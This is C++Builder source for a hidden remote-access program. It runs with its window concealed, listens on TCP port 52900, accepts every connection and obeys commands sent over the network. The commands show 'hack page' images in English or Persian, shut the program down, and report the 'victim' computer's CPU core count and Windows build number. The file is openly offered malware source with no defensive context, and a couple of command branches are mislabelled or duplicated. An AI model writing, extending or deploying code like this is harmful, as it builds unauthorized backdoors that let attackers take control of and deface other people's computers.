// ---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "ASVP.h"
#include "hpage.h"
// ---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma link "ipwipdaemon"
#pragma resource "*.dfm"
TForm1 *Form1;

// ---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner) : TForm(Owner) {
}

// ---------------------------------------------------------------------------

void __fastcall TForm1::IPDConnected(TObject *Sender,
	TipwIPDaemonConnectedEventParams *e)

{
	IPD->EOL[e->ConnectionId];
}
// ---------------------------------------------------------------------------

void __fastcall TForm1::IPDDataIn(TObject *Sender,
	TipwIPDaemonDataInEventParams *e)

{

	AnsiString command = (AnsiString(e->Text));

	// English Hack Page

	if (command == "enhpage") {

		Alert->enImage->Visible = true;

		Alert->Show();
		hpagetimer->Enabled = true;
		IPD->DataToSend[e->ConnectionId] = "English Hack Page Command   ->" +
			command + " <-" + " SuccessFully Run ." + '\n';
	}

	// . English Hack Page

	// Persian Hack Page

	else if (command == "fahpage") {
		Alert->faImage->Visible = true;
		Alert->Show();
		hpagetimer->Enabled = true;
		IPD->DataToSend[e->ConnectionId] = "Persian Hack Page Command   ->" +
			command + " <-" + " SuccessFully Run ." + '\n';
	}

	// . Persian Hack Page

	// Show The All Language Install In Victim Computer

	else if (command == "lang") {
		Alert->faImage->Visible = true;
		Alert->Show();
		hpagetimer->Enabled = true;
		IPD->DataToSend[e->ConnectionId] = "Show Language Command   ->" +
			command + " <-" + " SuccessFully Run ." + '\n';
	}

	// . Show The All Language Install In Victim Computer
	// selfkill
	else if (command == "selfkill") {

		Application->Terminate();
		IPD->DataToSend[e->ConnectionId] = "selfkill Command   ->" + command +
			" <-" + " SuccessFully Run ." + '\n';
	}
	// . selfkill

	// CPU Cores detection
	else if (command == "cpudetect") {

		int cpudetect = CPUCount;
		IPD->DataToSend[e->ConnectionId] = "CPU Cores detection Command   ->" +
			command + " <-" + " SuccessFully Run .Victim CPU Cores Is : " +
			"***" + cpudetect + "***" + '\n';
	}
	// . CPU Cores detection
	// Win32BuildNumber
	else if (command == "winbn") {

		int winbn = Win32BuildNumber;
		IPD->DataToSend[e->ConnectionId] = "selfkill Command   ->" + command +
			" <-" + " SuccessFully Run .Victim Win32 Build Number Is : " +
			"***" + winbn + "***" + '\n';
	}
	// . Win32BuildNumber

	// No Command
	else {
		IPD->DataToSend[e->ConnectionId] =
			command + "  Is No Exist - Try Again " + '\n';
	}
	// . No Command

}
// ---------------------------------------------------------------------------

void __fastcall TForm1::IPDConnectionRequest(TObject *Sender,
	TipwIPDaemonConnectionRequestEventParams *e)

{
	e->Accept = TRUE;
}

// ---------------------------------------------------------------------------
void __fastcall TForm1::FormCreate(TObject *Sender) {
	Application->ShowMainForm = false;
	IPD->LocalPort = 52900;
	IPD->Listening = TRUE;

}

// ---------------------------------------------------------------------------
void __fastcall TForm1::FormClose(TObject *Sender, TCloseAction &Action) {
	IPD->Listening = false;
}

// ---------------------------------------------------------------------------
void __fastcall TForm1::hpagetimerTimer(TObject *Sender) {
	Alert->Hide();
	Alert->enImage->Visible = false;
	Alert->faImage->Visible = false;
	hpagetimer->Enabled = false;
}
// ---------------------------------------------------------------------------
